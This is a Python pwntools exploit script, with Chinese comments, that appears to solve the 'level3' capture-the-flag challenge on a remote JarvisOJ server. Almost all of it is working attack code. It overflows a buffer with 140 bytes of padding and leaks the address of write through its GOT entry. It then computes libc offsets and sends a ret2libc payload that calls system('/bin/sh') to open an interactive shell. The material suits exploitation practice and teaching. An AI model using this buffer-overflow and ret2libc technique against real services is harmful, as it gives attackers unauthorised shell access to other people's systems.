#知识 
#	32位程序 传参 push        调用方式 从右向左 左方最后一个是ret的地址，调用时候不pop
#	公式 addr_write - offset = addr_sys - offset_sys = libc_base
#	如何获取addr_write
#   调用write函数(call write@plt) 参数(1 , write@got , 4) (32位程序 寄存器长度为4)
#	pwntools u32函数将write的结果转换为数字
#encoding:utf-8
from pwn import *

padding = 140 * 'a'
p = remote("pwn2.jarvisoj.com" , 9879)


def leak(addres):
	p.recv()
	payload = padding + p32(write_plt) + p32(addr_vul) +  p32(0x1) + p32(addres) + p32(0x4) 
	p.send(payload)
	addres_result = u32(p.recv(4))
	print "%#x => 0x%x" % (addres,addres_result)
	return addres_result

elf  = ELF("./level3")
libc = ELF("./libc-2.19.so")

write_got =  elf.got["write"]
write_plt =  elf.plt["write"]
addr_vul  =  elf.symbols["vulnerable_function"]

addr_write 		= leak(write_got)
offset_wirte 	= libc.symbols["write"]
offset_system 	= libc.symbols["system"]
offset_binsh 	= libc.search("/bin/sh").next()

addr_system = addr_write + (offset_system - offset_wirte)
addr_binsh  = addr_write + (offset_binsh - offset_wirte)
fake_addr   = 1

payload = padding + p32(addr_system) + p32(fake_addr) + p32(addr_binsh)
p.send(payload)
p.interactive()


